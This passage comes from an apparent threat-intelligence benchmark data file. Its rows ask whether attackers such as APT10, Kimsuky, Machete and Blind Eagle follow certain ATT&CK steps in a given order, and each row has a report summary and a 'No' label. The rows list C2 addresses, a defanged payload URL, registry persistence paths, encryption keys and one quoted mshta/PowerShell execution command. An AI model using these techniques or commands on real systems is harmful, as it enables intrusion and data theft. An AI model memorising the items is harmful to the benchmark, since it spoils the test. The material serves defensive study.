Execution: APT10 deploys malware to establish a foothold on a target network, using tools like PlugX, RedLeaves, or Quasar RAT for long-term remote access. The actor performs internal reconnaissance using common Windows tools and open-source pentesting tools. APT10 ensures access to legitimate credentials, often using the MSPs credentials, and deploys credential theft tools such as mimikatz or PwDump. The actor installs updates and new malware on compromised systems, using methods like reverse shell or RDP connections to propagate across the network.
Persistence: APT10 achieves persistence on victim networks primarily through scheduled tasks or Windows services, ensuring malware remains active despite system reboots. The actor targets both high-value systems for access and low-profile systems less likely to draw attention for long-term access.
Privilege Escalation: APT10 uses credential theft tools to gain higher-level permissions on compromised systems. The actor has been observed using stolen MSP credentials to gain administrator or domain administrator privileges.
Defense Evasion: APT10 has evolved from using malware associated with China-based threat actors to developing bespoke in-house malware like ChChes and RedLeaves. The actor also uses open-source malware like Quasar and extends its capabilities. APT10 uses DLL search order hijacking and sideloading to execute modified versions of open-source tools.
Credential Access: APT10 deploys tools like mimikatz or PwDump to steal credentials, often using DLL load order hijacking to execute against a domain controller.
Discovery: APT10 conducts internal reconnaissance to map out the network using common Windows tools and later stages using open-source pentesting tools.
Collection: APT10 identifies systems of interest and stages data for exfiltration in multi-part archives, often placed in the Recycle Bin, using compression tools launched via remote command execution scripts.
Command and Control: APT10 uses dynamic-DNS domains for command and control infrastructure, which are highly interconnected and link back to the actor's previous operations. The actor uses legitimate Robocopy tool and Putty Secure Copy Client (PSCP) to transfer data for command and control.
Exfiltration: APT10 'pushes' data from victim networks to other networks they have access to, such as other MSP or victim networks, then 'pulls' the data to locations from which they can directly obtain it, such as the threat actor's C2 servers.
Others: APT10, a China-based threat actor, has been active since at least 2009, evolving its targeting from the US defense industrial base and technology sectors to a global compromise of multiple industries. The actor has increased its scale and capability since early 2016, adding new custom tools and significantly increasing the number of dynamic-DNS domains used for operations. APT10's activities align with China Standard Time and its targeting corresponds with strategic Chinese interests. The actor's campaigns, including Operation Cloud Hopper, have targeted managed IT service providers (MSPs) and Japanese organizations, focusing on espionage and sensitive data collection. APT10's methodology includes spear phishing, use of bespoke and open-source malware, and leveraging MSP infrastructure for lateral movement and data exfiltration.",No
1679,398,398-Impact-T1565-Data Manipulation,"After using the manipulated debit cards to perform cash withdrawals from various ATMs, will attackers manipulate the bank's internal systems to enable high overdraft levels and remove anti-fraud controls only after coordinating ATM withdrawals across multiple cities and countries using command and control with physical mules?","Impact: The attackers manipulated the bank's internal systems to enable high overdraft levels and removed anti-fraud controls for specific accounts. They then used the manipulated debit cards to perform cash withdrawals from various ATMs, removing up to USD$10 million from each bank. The final stage of the operation took almost five hours to complete, with simultaneous debit card withdrawals across the geographic region.","Initial Access: The cybercriminal network behind the attack recruited individuals, referred to as 'mules', to open new bank accounts using counterfeit documents likely provided by the network. These mules then requested debit/ATM cards for the new accounts, which were later distributed outside the country for subsequent fraudulent use. The attackers gained initial entry into the bank's network through opportunistic phishing emails to employees, which led to the creation of backdoors on compromised systems. Social engineering techniques were also employed to obtain backdoor access.
Execution: The attackers executed several malicious payloads on the processor's network, including the installation of a legitimate monitoring tool, 'Mipko' (advertised as 'Employee Monitor'), on the processor's Terminal Server. This tool captured full information, including screen captures and keystrokes, for all users who logged into the system and accessed the card management application.
Privilege Escalation: After gaining initial access to the bank's network, the attackers leveraged control weaknesses in the Windows network to launch lateral movement attacks, obtain 'Keys to the Kingdom', and compromise the bank network. They also compromised the Enterprise Admin account on the processor's network, which gave them full access to the infrastructure.
Defense Evasion: Attackers adopted the tactic of 'living off the land', using legitimate Windows and PowerShell commands combined with tools such as PSExec for lateral movement, and plink.exe to access RDP over an established SSH tunnel. They also used commercial monitoring applications and 'Cobalt Strike Beacon' to maintain backdoor connections.
Credential Access: The attackers identified bank employee accounts on the card management application with authorization to request and approve changes to customer debit cards. They used these credentials to manipulate the cards associated with the rogue accounts created earlier.
Lateral Movement: The attackers compromised the third-party processor's network after numerous attempts, leveraging the bank's established connectivity with the processor. They used captured credentials to connect to the processor's network and executed reconnaissance of the card processing service.
Command and Control: The attackers coordinated ATM withdrawals across multiple cities and countries, using command and control with physical mules for coordinated cash outs. They carefully planned the choice of ATM locations based on criteria such as location, degree of physical security, and the ability to dispense substantial amounts of cash.",No
73,11,11-Discovery-T1083-File and Directory Discovery,"After ensuring persistence by creating a Windows service that initiates at system startup, is it likely that the malware collects and exfiltrates stolen HWP documents through encrypted emails before gathering information about the infected computer, including file and directory discovery?","Discovery: The malware gathers information about the infected computer, including system and user names, and outputs of the systeminfo command. It also collects keystrokes and directory listings.","Initial Access: For several months, an ongoing cyber-espionage campaign has been targeting South Korean think-tanks. The initial Trojan dropper, functioning as a loader for further malware, is typically delivered by spear-phishing emails. This dropper is a Dynamic Link Library that delivers another encrypted library from its resource section, which performs espionage functions.
Execution: Upon infection, the malware uses the Metasploit Framework's code to inject malicious code into explorer.exe on Windows 7 systems. It decrypts a spying library, saves it to disk with a hardcoded name in the user's temporary folder, and loads it as a library. This library then copies itself into the System32 directory and creates a service to ensure persistence.
Persistence: The malware ensures its persistence by copying itself into the System32 directory and creating a service with varying names such as DriverManage, WebService, and WebClientManager. These services are initiated at system startup.
Defense Evasion: The malware disables the system firewall and AhnLab firewall by modifying registry values. It also turns off the Windows Security Center service to prevent alerts about the disabled firewall. The attackers specifically target AhnLab security products, which are commonly used in South Korea, and do not bother evading foreign vendors' products.
Collection: The malware collects keystrokes, directory listings, and HWP documents. It sends this collected data to the attackers through encrypted emails.
Command and Control: Communication between the malware and the attackers occurs through a Bulgarian web-based free email server, mail.bg. The malware uses hardcoded credentials to send and receive instructions via email.
Exfiltration: The malware exfiltrates collected data, including system information, user-related info, and keystrokes, by encrypting it with RC4 and sending it to the attackers' email accounts.
Others: The campaign, attributed to the threat actor 'Kimsuky,' is suspected to originate from North Korea, given the targeted entities and the attackers' IP addresses located in China's Jilin and Liaoning provinces, which maintain lines into North Korea. The malware uses various files and MD5 hashes, and it creates services with specific names to operate. The attackers use modified TeamViewer components for remote control, and the malware is detected as Trojan.Win32.Kimsuky, except for the TeamViewer components, which are detected as Trojan.Win32.Patched.ps.",No
28,6,2637-Collection-T1056.004-Credential API Hooking,"After enumerating browser data such as bookmarks and reporting window names during discovery, is Machete likely to hook several Windows API functions to steal credentials before using Command and Control channels like FTP and HTTP for communication with its servers?","Collection: Machete collected data by stealing clipboard contents, copying files from local systems and removable media, logging keystrokes, capturing screenshots, and staging data in a temporary folder where files and logs were encrypted.","Initial Access: The Machete campaign utilized spearphishing as the primary method for initial access. Victims received emails containing either a link to download a compressed file from an external server or a zipped file with malicious contents. These emails were crafted to appear legitimate, often using real documents previously stolen from other victims as decoys. The documents used as decoys, such as classified military documents and Radiogramas, were sent and received legitimately several times a day by targets, making the phishing attempts highly convincing.
Execution: Machete's execution process involved the use of a downloader as the first stage, which installed the backdoor components on the compromised system. The downloader was a self-extracting file that opened a PDF or Microsoft Office file as a decoy and then ran the downloader executable. The actual Machete malware was then downloaded, decrypted, and executed.
Persistence: To maintain persistence, Machete created Windows Task Scheduler tasks to ensure the continued execution of its components. The malware also used hidden files and directories to avoid detection and ensure its components could survive system restarts and user logouts.
Defense Evasion: Machete employed various defense evasion techniques, including obfuscation of Python scripts, software packing using self-extracting files, and masquerading file and task names to impersonate legitimate applications like Google Chrome, Java, Dropbox, Adobe Reader, and Python executables.
Credential Access: Machete targeted credentials by scanning the compromised system for key and certificate file extensions and exfiltrating files with stored credentials for several browsers.
Discovery: The Machete malware conducted discovery activities by listing all nearby Wi-Fi networks using the netsh command, detecting newly inserted devices, producing file listings for exfiltration, and enumerating running processes in search of browsers. It also gathered browser data such as bookmarks and reported window names along with keylogger information.
Command and Control: Machete used standard FTP and HTTP ports for communication with its command and control (C&C) servers. It also implemented fallback channels, using HTTP to exfiltrate documents if FTP was unavailable. The malware could download additional files for execution on the victim's machine and used FTP and HTTP for C&C communication.
Exfiltration: Machete automatically exfiltrated all collected files to remote servers. The data was encrypted with AES before transmission, and in some versions, it was also base64 encoded. Browser profile data was compressed as .zip files prior to exfiltration. Data was exfiltrated over the same channel used for C&C, and scheduled transfers were set up to send data to the C&C server every 10 minutes. Additionally, data from all drives in a compromised system could be copied to a removable drive if a special file was present on that drive.",No
1427,341,341-Collection-T1056-Input Capture,"After performing keylogging for Collection using libCache32.exe, is it likely that the spyware will extract Chrome passwords for Credential Access by querying Google Chrome's SQLite databases using libchrome.exe?","Collection: The collection process involves sysOptimizer.bat, which collects and archives personal files from the infected system, including files from the Firefox directory and various file types from potential personal data folders. libCache32.exe and libTemp32.exe are also involved in the collection process, performing keylogging and clipboard content logging.","Initial Access: During routine analysis, Bitdefender researchers discovered that the initial access to infected systems was primarily through an installer named 20SPEED-VPN-v9.2.exe, which contained components of the SecondEye monitoring application. This installer was not recognized as a valid InnoSetup executable, indicating it was a different type of installer, possibly Smart Install Maker. The installer placed spyware components in the %LOCALAPPDATA%\Microsoft\WindowsApps directory and launched the first stage of the spyware, sysCrt32.exe, along with a legitimate InnoSetup installer for the VPN software located in the %TEMP% folder.
Execution: The execution flow begins with sysCrt32.exe, which ensures persistence and adds the WindowsApps folder to the %PATH% environment variable. It then executes various batch files for initialization and sets up scheduled tasks to run sysBus32.exe every 3 hours. sysBus32.exe is responsible for downloading and executing the second stage from the C2 server. Other executables like libCache32.exe, libTemp32.exe, and libchrome.exe are also part of the execution process, performing keylogging, clipboard logging, and Chrome password extraction, respectively.
Persistence: The spyware establishes persistence by adding the WindowsApps folder to the %PATH% environment variable and setting up scheduled tasks to run sysBus32.exe every 3 hours. sysCrt32.exe checks for the presence of the folder in the environment variables and the scheduled task, and if not found, calls scripts to add them.
Credential Access: The spyware components include libchrome.exe, which queries Google Chrome's SQLite databases to log usernames and passwords. It uses stolen tokens from Local State and Login Data files to decrypt the stored passwords.
Command and Control: The C2 servers belong to SecondEye and are hosted on Novinhost. The IP used by the initial execution flow is 213.232.124.157, and the other IP used by the additional payloads is 94.130.247.148. The servers are not always running, and the malware uses curl.exe to access the FTP servers.
Exfiltration: The exfiltration process is handled by sysUp32.bat, which collects all files created by the components and uploads them to the FTP server. It also exfiltrates Chrome passwords and crypto-wallet data for various applications.
Others: The campaign distribution indicates a growing number of detections in the past 6 months, particularly in Iran, as individuals seek VPN access to the internet. Bitdefender protects against this threat by detecting the malicious installer and blocking the process that initializes the spyware. The malicious executables from the second stage are also detected, and existing infections are identified by detecting the persistence process. The article recommends using well-known VPN solutions from legitimate sources and a security solution like Bitdefender to protect against information stealers.",No
1171,285,285-Command and Control-T1071-Application Layer Protocol,"After the Taidoor malware communicates with the command-and-control servers roudan.serveftp.com and mac.gov.hpc.tw, is it likely that it avoids detection by using a downloader that decrypts a modified version of the malware?","Command and Control: The new Taidoor variant communicates with two CnC servers: roudan.serveftp.com and mac.gov.hpc.tw. The network traffic, or 'callback,' has been modified from the traditional version to use different file path names and formats.","Reconnaissance: The Taidoor malware campaign begins with a spear-phishing email sent to targets, which may include government agencies, corporate entities, and think tanks, particularly those with interests in Taiwan. The email entices recipients to open an attached file, which, if executed on a vulnerable system, silently installs malware.
Initial Access: The Taidoor malware is delivered via email attachments. When the attachment is opened, it exploits a vulnerability in Microsoft Office (CVE-2012-0158) to drop the malware onto the target's system. A decoy document containing legitimate content is simultaneously opened to alleviate any suspicions.
Execution: The Taidoor malware, once installed, begins to beacon to a command-and-control (CnC) server using a consistent HTTP GET request pattern that includes an encrypted MAC address of the compromised computer.
Defense Evasion: Taidoor has evolved to avoid common network detection signatures. The new variant uses a 'downloader' that retrieves encrypted text from Yahoo Blogs posts, which is then decrypted to a modified version of the Taidoor malware. This variant has also changed its network traffic pattern to avoid detection.
Others: The Taidoor malware has been active since 2008 and continues to be used in cyber espionage campaigns. It has undergone significant tactical changes in 2011 and 2012. The malware is not off-the-shelf and suggests a connection between various activities using Taidoor. Another malware family, 'Taleret,' uses a similar technique to Taidoor for CnC server communication. There is a frequent association with Taiwan and a similar CnC naming scheme between Taidoor and Taleret.",No
634,164,520-Defense Evasion-T1622-Debugger Evasion,"After the INOCNATION campaign gains initial access by using a decoy installer for Cisco AnyConnect Mobility Client and executes a malicious DLL payload with anti-behavioral analysis techniques, is it likely that the campaign will use Debugger Evasion tactics, such as the CheckRemoteDebuggerPresent function or checking system flags and CPU registers, before establishing command and control through encrypted HTTPS via SSL/TLS connections with additional XOR encoding?","Defense Evasion: The INOCNATION campaign's malware exhibited several defense evasion techniques, including the use of XOR obfuscation for components and strings, sandbox detection, and a mangled MZ header to deceive security products. The malware also employed string stacking obfuscation with Unicode strings and multiple layers of obfuscation for its command and control traffic.","Initial Access: The INOCNATION campaign utilized a decoy installer for Cisco AnyConnect Mobility Client to facilitate initial access. The installer, disguised as a legitimate application, would execute regardless of the victim's decision to cancel the installation, silently creating and entrenching the malware into the system's background. The use of a widely recognized security application as an embedded decoy indicates a sophisticated ploy to deceive average users or less experienced system administrators.
Execution: The INOCNATION campaign's RAT installer executed a malicious DLL payload, which was obfuscated and rebuilt during installation. The malware employed anti-behavioral analysis techniques, such as comparing mouse cursor positions to detect sandbox environments. Additionally, the malware used a mangled MZ header to deceive security products and evade detection.
Persistence: The RAT installer set up a persistence mechanism for the payload malware by creating a registry key for entrenchment. This key would be referenced during the uninstall routine, indicating the malware's capability to maintain its foothold on the system.
Command and Control: The malware used encrypted HTTPS via SSL/TLS connections for command and control communications, employing Windows' standard SSL/TLS libraries. To further obfuscate the communications, the malware used a single-byte XOR encoding within the decrypted SSL/TLS communication. This additional layer of obfuscation was designed to thwart detection and analysis efforts, even in environments with SSL inspection devices.
Others: The INOCNATION campaign's malware was capable of receiving commands from its C2 server, including process execution, reverse shell, file activity, uploading and downloading files, system information retrieval, and uninstalling the malware. The uninstall command suggests that the threat actor aimed to maintain a limited number of victims by removing the tool when commanded. Fidelis Cybersecurity's products detect the activity documented in this report, and additional technical indicators are published on their GitHub repository. The malware samples analyzed in this report were shared by CrowdStrike.",No
516,133,264-Defense Evasion-T1548.002-Bypass User Account Control,"Is it likely that the attackers will bypass User Account Control (UAC) to elevate privileges after delivering the RAT payload via email attachments or by tricking users into downloading files, but before maintaining persistence by creating a registry key pointing to PerfWatson.exe and nvSCPAPISrv.exe?","Defense Evasion: The attackers use a technique that ensures the RAT payload remains in memory throughout its execution, never touching the disk in a decrypted state, to evade detection by antivirus technologies. They also have the capability to detect the presence of a virtual machine to avoid analysis in a network sandbox. The NanoCore RAT payload is injected into a new process without being written to disk.","Initial Access: Attackers have traditionally deployed RATs (Remote Access Trojans) by tricking users into opening email attachments or downloading files from websites or peer-to-peer networks. These methods involve file-based vectors that are easier to detect.
Execution: The attackers have developed a sophisticated technique to execute RATs entirely in memory, avoiding disk interaction in a decrypted state, which helps them evade antivirus and 'next-generation' technologies focused on file-based threats. SentinelOne EPP has confirmed that this technique does not evade its behavior-based detection mechanisms, as it monitors all processes at the user-space/kernel-space interface.
Persistence: For persistence, the attackers create a registry key at HKEY_CURRENT_USER\Software\Microsoft\Windows\NT\CurrentVersion\Windows\Load pointing to the PerfWatson.exe binary, which is executed along with a copied binary named nvSCPAPISrv.exe located at %APPDATA%\Microsoft\Blend\14.0\FeedCache\.
Command and Control: The RAT attempts to connect back to its control server, which is associated with the domain chickenkiller.com, owned by a free dynamic DNS service. At the time of writing, the DNS records exist, but the address they resolve to appears to be down.
Others: The main sample analyzed is a 32-bit executable with various hashes provided. The unpacked samples include a packed 'Benchmark' DLL, a monitor named PerfWatson.exe, and the NanoCore RAT dumped from memory. The 'Benchmark' .NET DLL is XOR encrypted and contains logic to unpack and inject the RAT, as well as monitor the application. The settings and NanoCore executable are serialized, DES encrypted, and stored across multiple PNG files as pixel data. A C# decompilation method is used to extract information from the pixel data. SentinelOne provides resources on how to protect against such attacks.",No
1060,260,1263-Defense Evasion-T1027.011-Fileless Storage,"Is it likely that after initial access is gained via a JavaScript downloader employing ActiveXObject to execute PowerShell commands, Blind Eagle will use a backdoor to store its configuration in a registry key for defense evasion before placing a VBScript in the Startup folder to ensure persistence through system startup execution of batch files?","Defense Evasion: The PowerShell script in the second stage includes an AMSI bypass method, which is a defense evasion technique. Additionally, the obfuscation of scripts and registry values serves as a means to evade detection.","Initial Access: In the first stage, Blind Eagle utilizes a JavaScript downloader that employs ActiveXObject to execute PowerShell commands. The group leverages Discord CDNs to host the subsequent stage script, specifically downloading and executing a script from the URL 'hxxp://cdn.discordapp[.]com/attachments/940363101067411527/946390049979781130/cacha.pdf'.
Execution: The second stage involves a PowerShell script that begins by loading a DLL into memory from an obfuscated and Base64 encoded string. This DLL, a .NET portable executable, contains a method named Bypass(), which serves as an AMSI (AntiMalware Scan Interface) bypasser. Upon successful bypass, the message 'bypass' is displayed in the console, while any exceptions during execution are caught and their messages are output to the console. The PowerShell script then checks for the presence of the registry key HKCU:\software\wow6432node\Microsoft\WindowsUpdate. If absent, the script creates the key and sets an obfuscated value without deobfuscation. It proceeds to drop two files: a PowerShell script named myScript.ps1 and a batch file named SystemLogin.bat. Finally, a VBScript named Login1.vbs is placed in the Startup folder to execute upon system start, which in turn executes the previously dropped SystemLogin.bat. The fourth stage reveals an obfuscated batch script that, when deobfuscated, executes the myScript.ps1 PowerShell script using the command 'mshta """"powershell 'C:\Users\Public\myScript.ps1'"""", 0:close')' and a VBScript execution command. The fifth stage involves another PowerShell script that loads the same AMSIBypasser DLL from the second stage and calls its method. It then loads a second DLL, an AES256 Decryptor, to decrypt the contents of the HKCU:\software\wow6432node\Microsoft\WindowsUpdate registry key using the passphrase '5456846176463687555'. The decrypted content is a new PowerShell script leading to njRAT, a remote access tool (RAT) known as Bladabindi, which allows the attacker to control the victim's computer.
Persistence: The third stage involves a VBScript named Login1.vbs placed in the Startup folder, which ensures the execution of the SystemLogin.bat batch file upon system startup.
Command and Control: The final PowerShell script in the fifth stage leads to njRAT, which is a remote access tool (RAT) that establishes command and control over the victim's computer.
Others: APT Blind Eagle, also known as APT-C-36, is a suspected South American espionage group active since at least 2018, targeting Colombian government institutions and corporations in the financial, petroleum, and professional manufacturing sectors. They employ sophisticated attack techniques, including custom malware, social engineering, spear-phishing, and zero-day exploits. Indicators of compromise (IoCs) and a YARA rule authored by 'seyitsec' on 2023-04-16 have been provided to detect and defend against Blind Eagle's attacks. The YARA rule includes hashes and strings to identify the malware stages, and the IoCs list includes SHA256 hashes of malicious files and a malicious URL hosted on Discord's CDN. The MITRE ATT&CK framework identifies the tactics used by Blind Eagle, including PowerShell (T1059.001), Scripting (T1064), Startup Folder (T1547.001), Process Injection (T1055), Masquerading (T1036), Sandbox Evasion (T1497), and Application Layer Protocol (T1071).",No
1426,341,1924-Execution-T1559.002-Dynamic Data Exchange,"After achieving initial access by placing spyware components in the %LOCALAPPDATA%\Microsoft\WindowsApps directory and launching sysCrt32.exe, is it likely that the spyware will use Windows DDE for execution of commands and a malicious VBS before establishing persistence by ensuring the WindowsApps folder is added to the %PATH% environment variable?","Execution: The execution flow begins with sysCrt32.exe, which ensures persistence and adds the WindowsApps folder to the %PATH% environment variable. It then executes various batch files for initialization and sets up scheduled tasks to run sysBus32.exe every 3 hours. sysBus32.exe is responsible for downloading and executing the second stage from the C2 server. Other executables like libCache32.exe, libTemp32.exe, and libchrome.exe are also part of the execution process, performing keylogging, clipboard logging, and Chrome password extraction, respectively.","Initial Access: During routine analysis, Bitdefender researchers discovered that the initial access to infected systems was primarily through an installer named 20SPEED-VPN-v9.2.exe, which contained components of the SecondEye monitoring application. This installer was not recognized as a valid InnoSetup executable, indicating it was a different type of installer, possibly Smart Install Maker. The installer placed spyware components in the %LOCALAPPDATA%\Microsoft\WindowsApps directory and launched the first stage of the spyware, sysCrt32.exe, along with a legitimate InnoSetup installer for the VPN software located in the %TEMP% folder.
Persistence: The spyware establishes persistence by adding the WindowsApps folder to the %PATH% environment variable and setting up scheduled tasks to run sysBus32.exe every 3 hours. sysCrt32.exe checks for the presence of the folder in the environment variables and the scheduled task, and if not found, calls scripts to add them.
Credential Access: The spyware components include libchrome.exe, which queries Google Chrome's SQLite databases to log usernames and passwords. It uses stolen tokens from Local State and Login Data files to decrypt the stored passwords.
Collection: The collection process involves sysOptimizer.bat, which collects and archives personal files from the infected system, including files from the Firefox directory and various file types from potential personal data folders. libCache32.exe and libTemp32.exe are also involved in the collection process, performing keylogging and clipboard content logging.
Command and Control: The C2 servers belong to SecondEye and are hosted on Novinhost. The IP used by the initial execution flow is 213.232.124.157, and the other IP used by the additional payloads is 94.130.247.148. The servers are not always running, and the malware uses curl.exe to access the FTP servers.
Exfiltration: The exfiltration process is handled by sysUp32.bat, which collects all files created by the components and uploads them to the FTP server. It also exfiltrates Chrome passwords and crypto-wallet data for various applications.
Others: The campaign distribution indicates a growing number of detections in the past 6 months, particularly in Iran, as individuals seek VPN access to the internet. Bitdefender protects against this threat by detecting the malicious installer and blocking the process that initializes the spyware. The malicious executables from the second stage are also detected, and existing infections are identified by detecting the persistence process. The article recommends using well-known VPN solutions from legitimate sources and a security solution like Bitdefender to protect against information stealers.",No
303,72,72-Command and Control-T1071-Application Layer Protocol,"After the malware collected data such as keystrokes, clipboard content, and account information from various sources on the victim's device, is it likely that it exfiltrated the collected information through HTTP GET posts and email messages before establishing communication with a command center at the IP address 192.169.82.86?","Command and Control: The malware communicated with a command center at the IP address 192.169.82.86 to deliver collected information, which included passwords, clipboard data, and screenshots. The IP address appeared to belong to a compromised device running multiple malware campaigns.","Reconnaissance: The attackers initiated their campaign by sending spear phishing emails to senior members and executives of targeted organizations, aiming to lure them with what appeared to be payment documents from a bank in the UAE, Emirates NBD. These emails contained compressed executables or phishing links, with fake sources used to deliver the emails to victims.
Resource Development: The malware used in the attacks, based on the Hawkeye commercial spyware, was designed to collect a variety of data from the victim's device, including passwords, keystrokes, and screenshots. This commercial off-the-shelf malware provided anonymity for the attackers, making attribution more difficult.
Initial Access: The initial access to the victim's network was achieved through spear phishing emails that included a 7z file with a malware executable disguised as a payment instruction document. The emails targeted senior members and executives within the organizations.
Execution: Upon execution, the malware self-deployed and configured persistence using anti-debugging and timeout techniques. It then began collecting data from the victim's device, such as keystrokes, clipboard data, and account data from various applications and clients.
Persistence: The malware established persistence on the victim's device to maintain access and continue its data collection activities.
Defense Evasion: The malware employed anti-debugging and timeout techniques to evade detection and maintain its presence on the victim's device.
Credential Access: The malware collected a variety of sensitive information, including FileZilla FTP server credentials, account data from local browsers, messaging clients, email clients, and license information of some installed applications.
Collection: The malware collected data such as keystrokes, clipboard data, and account information from various sources on the victim's device.
Exfiltration: Data exfiltration was primarily conducted via HTTP GET posts sent to the IP address 192.169.82.86 and email messages sent to addresses associated with compromised organizations operating in manufacturing and technology services.
Others: The attackers targeted over 130 organizations in more than 30 countries, focusing on industrial, engineering, and manufacturing sectors. The campaign, traced back to March 2015, seemed financially motivated. The attackers were particularly active in the Middle East, with a significant number of victims located in the United Arab Emirates. Phishing pages and links were also used, with victims connecting from various devices including Windows, Mac OS X, Ubuntu, iPhone, and Android. Kaspersky Lab detected the malware using heuristic signatures and provided a list of indicators of compromise, including filenames, paths, MD5 hashes, domains, and phishing URLs related to the malware.",No
811,209,209-Collection-T1025-Data from Removable Media,"After exfiltrating the processed and encrypted data to the C2 server, is it likely that WinDealer collected data from removable media and targeted relevant folders only after discovering information about the infected PC and network configuration and staging encrypted stolen data in the %TEMP% folder?","Collection: The malware collects data from the victim's PC, including files stored on USB memory, documents, desktop items, and recycle bin contents. It also targets folders related to SNS applications. The collected data is processed into "".a"" files by a module and is categorized into different directories based on the data type.","Execution: The WinDealer malware, associated with the LuoYu Attack Group, executes upon launch by reading its configuration from a file located under C:\ProgramData. It then loads a DLL module into memory. The malware is designed to steal information from the victim's PC, including network configuration and details from SNS applications, and saves this data with a "".a"" extension in the %TEMP% directory. This information is subsequently sent to a C2 server.
Defense Evasion: WinDealer employs defense evasion by encoding its configuration files using XOR with the key value ""b6a7%7486"". It also communicates with C2 servers using encrypted channels, specifically encrypting an AES key with RSA and sending it to the C2 server. The malware further encrypts stolen information using AES128bit ECB mode before transmission.
Discovery: WinDealer discovers information about the infected PC and network configuration, as well as data from SNS applications. It processes and stages the stolen data in a folder under %TEMP%, encrypting it with AES before sending it to a C2 server.
Command and Control: WinDealer communicates with C2 servers using UDP port 6999 or TCP port 55556. It encrypts an AES key with RSA and sends it to the C2 server, which then sends commands back to the victim PC. The malware executes these commands and sends the results back to the C2 server after encryption. It also communicates with non-existent domains and uses icanhazip[.]com for IP address verification.
Exfiltration: The malware exfiltrates stolen data to a C2 server after processing and encrypting it. The data is sent from the %TEMP% directory where it is staged as "".a"" files.
Others: The LuoYu Attack Group has been targeting Korean and Japanese organizations since 2014. The WinDealer malware is one of the tools used by this group, and it operates on various platforms. The malware has been observed to monitor and process data from USB memory, documents, desktop, recycle bin, and SNS application folders. The malware's configuration is stored in several folders under C:\ProgramData, and it uses a hardcoded RSA1024bit public key for encryption. The malware's communication with C2 servers includes sending an encrypted AES key and receiving commands. The malware's DLL module, named ""MozillaDll.dll"", has export functions for stealing data, setting configuration, and initiating commands. The malware also monitors items such as files stored in USB memory and folders related to SNS applications, saving related items in separate files to be sent to a C2 server.",No
1185,288,288-Execution-T1559-Inter-Process Communication,"After initiating cleanup procedures designed for defense evasion if it encounters communication failures, is Tildeb likely to inject code into a Microsoft Exchange Server process only before using command-line arguments to establish communication with its C&C server?","Execution: The implant, identified as Tildeb, is a 32-bit console Windows executable named clocksvc.exe, which accepts command-line arguments and was compiled on October 3, 2000. It utilizes the MFC library, specifically mfc42.dll, for network communications and is compiled using Microsoft Visual C++ v6.0. Tildeb does not employ obfuscation techniques such as anti-disassembly, anti-debugging features, or encrypted strings. The implant can operate with various command-line arguments to establish communication with its C&C server using a hardcoded IP address and port, or alternative IP/domain and ports provided as arguments. It also has a capability to listen on a TCP socket for incoming connections and can attempt privilege elevation to inject code into a Microsoft Exchange Server process.","Defense Evasion: Tildeb lacks persistence mechanisms and is designed to clean up after itself if it does not receive data from the C&C server or encounters specific failures. It includes a cleanup thread that triggers a cleanup process under certain conditions, such as a lack of communication from the C&C server or failure to create a process. The cleanup process involves closing handles, deleting temporary files, shutting down sockets, and terminating the process.
Command and Control: Tildeb establishes network communication with its C&C server over TCP, using either ingress or egress connections. It employs the MFC Classes CAsyncSocket and CSocket for network communications and does not use SMTP despite the default port number assignment. The implant sets up a secure communication channel with the server, where all subsequent traffic is encrypted. It uses a modified SHA-1 hashing algorithm to generate pseudorandom data for establishing session keys, which are then used for XOR-encrypted communication.
Others: The implant Tildeb is associated with the moniker 'PATROLWAGON,' which is likely a reference to an unknown exploitation framework or tool. Tildeb's delivery method is not specified, but it may be distributed via lateral movement or other exploitation frameworks with RCE modules targeting Windows NT. The implant's hardcoded IP address contains a formatting error that affects its connectivity on different versions of Windows OS. Tildeb supports various control commands for malicious activities, including file deletion, file upload, directory listing, registry value modification, and code injection into Microsoft Exchange Server processes. It uses mailslots for interprocess communication and has specific routines for injecting code into Exchange Server processes. The implant attempts to exploit an unknown privilege escalation vulnerability in the win32k.sys driver on systems with specific locale settings.",No
689,176,176-Defense Evasion-T1197-BITS Jobs,"After attackers gain initial access to hosts by identifying internal systems and remote control software through tools such as Advanced IP Scanner and PushVNC package, is it likely that they will use AutoExe1.bat to download malware via BITS jobs only before identifying internal systems and remote control software?","Defense Evasion: Attackers used AutoExe1.bat to download malware using BITS, clear system events, and delete traces of their activity. They also used AutoExe.bat to load Neutrino/Kasidet variants with PoS functionality, combining previous batch files Setup.bat and ClearEventN.bat. Tools like xDedic RDP Patch were used to maintain access even after password changes.","Reconnaissance: The CTI report details the use of various tools by attackers to probe and compromise IP addresses, including Medusa, Simple SMTP Scanner, Fast SYN Scanner, nVNC Scanner package, nCrack, nPCA Bruter, Fast RDP Brute GUI v2.0 package, Sentry MBA, RealVNC viewer 5.2.3, Cain and Abel, and RDP Scanner X. These tools were used to enumerate services, authenticate via brute force, fingerprint remote SMTP servers, scan ports, and authenticate on VNC and RDP ports.
Initial Access: The attackers gained initial access to hosts using tools such as Advanced IP Scanner, Radmin, PushVNC package, Fgdump, Dameware, VNC Password Recovery Tool, and xDedic RDP Patch. These tools helped identify internal hosts, remotely control software, push and start VNC services, extract password hashes, and create new local accounts.
Others: The report discusses the use of PoS malware threats such as NewPOSThings, Project Hook, PwnPOS, Alina, and Kasidet/Neutrino, which share file characteristics, distribution methods, and sources. Gorynych, a modular botnet client, was retrofitted to use BlackPOS and target PoS systems. Spy Net RAT was used for remote access and control, with capabilities like password grabbing and keylogging. The report also covers victimology, indicating that SMBs were common targets due to open ports for outsourced IT services or remote access by in-house IT admins. Attribution is uncertain, but tools used for initial entry are commonly discussed in security forums, and some file names suggest a Central European language origin. The report concludes with recommendations for both small and large organizations to secure their networks and monitor for threats.",No
1620,384,2292-Discovery-T1069.002-Domain Groups,"After DNSpionage malware decodes a PE file encoded with base64 and executes it as a scheduled task as part of its execution phase, is it likely that it will enumerate domain groups using AdFind to understand the environment during the discovery phase?","Discovery: The DNSpionage malware's initial reconnaissance phase involves commands to retrieve the infected user's username, hostname, and domain information, indicating a discovery process to understand the environment.","Reconnaissance: The DNSpionage campaign involved meticulous reconnaissance, as evidenced by the attackers' understanding of the victims' network infrastructure to remain undetected. They targeted Lebanon and the UAE, focusing on .gov domains and a private Lebanese airline. The attackers likely used spear-phishing via email or social media platforms like LinkedIn to distribute malicious Microsoft Office documents with embedded macros, disguised as job postings on fake websites such as hr-wipro[.]com and hr-suncor[.]com.
Resource Development: The DNSpionage campaign demonstrated resource development by the attackers, who created two fake websites with job postings to compromise targets. They also generated Let's Encrypt certificates for redirected domains during DNS compromises, although it is unclear if these redirections were successful.
